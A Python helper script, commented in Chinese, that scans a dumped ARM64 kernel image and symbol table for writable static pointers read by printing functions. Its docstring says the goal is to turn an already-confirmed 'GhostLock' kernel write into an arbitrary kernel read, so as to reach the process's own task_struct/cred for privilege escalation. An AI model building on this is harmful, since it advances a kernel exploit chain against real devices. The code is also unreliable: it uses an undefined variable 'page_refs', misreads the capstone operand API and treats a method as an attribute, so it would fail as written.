#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""find_printed_writable_ptrs.py —— 找"打印路径里 ldr 出来的可写静态指针"。

为什么只找这一类: GhostLock 的写通道已经真机证实(任意对齐 8 字节写, 每发两笔, 且能用 uname
自校验), 唯一缺口是**一个动态内核地址**(自己的 task_struct/cred)。要拿到它就需要一次"任意内核读"。
`cmdline_proc_show` 那种 `adrp X=某页; ldr x1,[X,#imm]; bl seq_puts` 的形状就是我们要的形状:
**只要有一个 shell 可达的输出路径, 把它要打印的指针存在 .data/.bss(可写) 里**, 我们就能把它指到
任意内核地址 ⇒ 读回来。上一轮已证明 saved_command_line 这一个实例在此构建不成立 ⇒ 换成穷举找同类。

做法(纯离线, 不动设备):
 1. 反汇编整个 .text, 记录每条 adrp 的目标页 + 目标页属于哪种段(可写 D/d/B/b 还是只读);
 2. 抓 `adrp(可写页) → 紧跟 ldr/ldrb` 的取指针点, 算出它读的**静态槽地址**;
 3. 用 kallsyms 把"所在函数"归名, 只保留名字像输出路径的(*_show / *_print / seq_ / *_read /
    proc_ / *_getattr / dev_*), 另附一份"全量"便于人工挖;
 4. 顺带标注该槽当前指向哪儿(用 .rela: R_AARCH64_RELATIVE 的 dest→addend)⇒ 一眼看出它是不是字符串/表源。
用法: python analysis/find_printed_writable_ptrs.py [--all]
"""
import bisect, collections, io, os, re, struct, sys

HERE = os.path.dirname(os.path.abspath(__file__))
IMG = os.path.join(HERE, 'kernel_dev_g2a88cd145def.bin')
KS = os.path.join(HERE, 'kallsyms_g2a88cd145def.txt')
BASE = 0xffffffc010080000
TEXT_LEN = 0x1520000
data = io.open(IMG, 'rb').read()

sym = []
for line in io.open(KS, encoding='utf-8', errors='replace'):
    p = line.split()
    if len(p) >= 3 and re.fullmatch(r'[0-9a-f]{16}', p[0]):
        sym.append((int(p[0], 16), p[1], p[2]))
sym.sort()
addrs = [a for a, _, _ in sym]
type_of = {}
for a, t, n in sym:
    type_of[a] = t


def sym_at(a):
    i = bisect.bisect_right(addrs, a) - 1
    if i < 0:
        return None
    s, t, n = sym[i]
    return (n, t, a - s)


def slot_type(dest):
    """槽所在符号的类型(决定可写性): D/d=.data, B/b=.bss 可写; R/r=rodata 只读。"""
    r = sym_at(dest)
    return r[1] if r else '?'


# .rela: dest -> addend, 用来看"这个槽现在指向谁"
rela = {}
for off in range(0, len(data) - 24, 8):
    if data[off + 8] == 0x03 and data[off + 9] == 0x04 and not any(data[off + 10:off + 16]):
        dest = int.from_bytes(data[off:off + 8], 'little')
        add = int.from_bytes(data[off + 16:off + 24], 'little')
        rela[dest] = add

# ---- 扫 .text: 找 "adrp 可写页 → 同寄存器 ldr 取指针" 的取用点 ----
def sxt(v, bits):
    m = 1 << (bits - 1)
    return (v ^ m) - m


# 用 capstone 做精确的 (adrp, ldr) 配对:
try:
    from capstone import Cs, CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN
    HAVE = True
except Exception:
    HAVE = False
    print('!! 没有 capstone, 只能给 adrp 页统计')

WANT = set('DdbB')                                   # 可写段的类型
out_print = re.compile(r'(_show|_print|seq_|_read|proc_|getattr|show_|dump|info)', re.I)
hits = []

if HAVE:
    md = Cs(CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN)
    md.detail = True
    code = data[BASE - BASE: TEXT_LEN]
    last_adrp = {}          # reg -> page
    for ins in md.disasm(code, BASE):
        mn = ins.mnemonic
        ops = ins.operands
        if mn == 'adrp' and len(ops) == 2:
            reg, pg = ops[0]['reg'], ops[1]['imm']
            if pg in page_refs or True:
                last_adrp[reg] = pg
            continue
        if mn.startswith('ld') and ins.reg_read and len(ops) >= 2:
            base_reg = None
            try:
                mem = ops[-1]['mem']
                base_reg = mem.get('base')
            except Exception:
                base_reg = None
            if base_reg is None:
                continue
            pg = last_adrp.get(base_reg)
            if pg is None:
                continue
            disp = mem.get('disp') or 0
            dest = pg + disp
            if not (BASE <= dest < BASE + len(data)):
                continue
            st = slot_type(dest)
            if st not in WANT:
                continue
            fn = sym_at(ins.address)
            if not fn:
                continue
            hits.append((dest, st, fn[0], ins.address, sym_at(dest)[0] if sym_at(dest) else '?'))
    seen = set()
    rows = []
    for dest, st, fname, at, slotname in hits:
        k = (dest, fname)
        if k in seen:
            continue
        seen.add(k)
        rows.append((dest, st, slotname, fname, at))
    pr = [r for r in rows if out_print.search(r[3] or '')]
    print('可写槽被取用的点: %d 处; 其中"所在函数名字像输出路径": %d 处' % (len(rows), len(pr)))
    for dest, st, slotname, fname, at in sorted(pr)[:120]:
        add = rela.get(dest)
        tgt = sym_at(add)[0] if add and sym_at(add) else '-'
        print('  槽 %016x(%s, 属于 %s) 现在指向 %-30s  <- 读它的函数 %s @%x'
              % (dest, st, slotname, tgt, fname, at))
    if '--all' in sys.argv:
        print('--- 全量(前 200) ---')
        for dest, st, slotname, fname, at in sorted(rows)[:200]:
            print('  %016x %-2s %-30s <- %s' % (dest, st, slotname, fname))
